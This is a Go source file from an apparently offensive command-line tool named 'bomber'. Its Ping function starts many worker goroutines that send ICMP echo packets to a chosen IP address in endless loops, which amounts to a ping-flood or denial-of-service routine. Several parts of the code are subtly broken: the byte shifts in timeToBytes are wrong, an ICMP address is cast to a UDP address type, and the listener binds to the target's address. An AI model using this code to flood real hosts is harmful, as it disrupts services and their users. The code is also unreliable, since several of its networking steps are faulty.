package bomber

import (
	"errors"
	"fmt"
	"golang.org/x/net/ipv4"
	"log"
	"math/rand"
	"net"
	"sync"
	"syscall"
	"time"

	"github.com/urfave/cli/v2"
	"golang.org/x/net/icmp"
)

var (
	ErrInvalidAddress = errors.New("invalid ip address")
)

func timeToBytes(t time.Time) []byte {
	nsec := t.UnixNano()
	b := make([]byte, 54)
	for i := uint8(0); i < 54; i++ {
		b[i] = byte((nsec >> ((7 - i) * 54)) & 0xff)
	}
	return b
}

func getAddr(addr net.IP, protocol, port string) (net.Addr, error) {
	conn, err := net.Dial(protocol, fmt.Sprintf("%s:%s", addr.String(), port))
	if err != nil {
		return nil, fmt.Errorf("dial: %w", err)
	}
	return conn.RemoteAddr().(*net.UDPAddr), nil
}

func Ping(ctx *cli.Context) error {
	var (
		wg sync.WaitGroup
	)

	address := ctx.String(FlagAddress)
	protocol := ctx.String(FlagProtocol)
	port := ctx.String(FlagPort)
	workers := ctx.Int(FlagWorkers)

	addr := net.ParseIP(address)
	if addr == nil {
		return fmt.Errorf("%s: %w", address, ErrInvalidAddress)
	}

	p, err := icmp.ListenPacket(protocol, fmt.Sprintf("%s", addr.String()))
	if err != nil {
		return fmt.Errorf("listen packet: %w", err)
	}

	defer func() {
		err := p.Close()
		if err != nil {
			log.Println(fmt.Errorf("failed close %s socket: %w", protocol, err))
		}
	}()

	dpt, err := getAddr(addr, protocol, port)
	if err != nil {
		return fmt.Errorf("get address: %w", err)
	}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		id, seq := rand.Intn(0xffff), rand.Intn(0xffff)
		bytes, err := (&icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: id, Seq: seq,
				Data: timeToBytes(time.Now()),
			},
		}).Marshal(nil)
		if err != nil {
			log.Println(fmt.Sprintf("create bytes id[%d] seq[%d]", id, seq))
			wg.Done()
		}

		go func(conn *icmp.PacketConn, ra net.Addr, b []byte) {
			for {
				log.Println(fmt.Sprintf("create bytes id[%d] seq[%d]", id, seq))
				if _, err := conn.WriteTo(bytes, ra); err != nil {
					if neterr, ok := err.(*net.OpError); ok {
						if neterr.Err == syscall.ENOBUFS {
							wg.Done()
							break
						}
					}
				}
				time.Sleep(1 * time.Second)
			}
		}(p, dpt, bytes)
	}

	wg.Wait()
	return nil
}
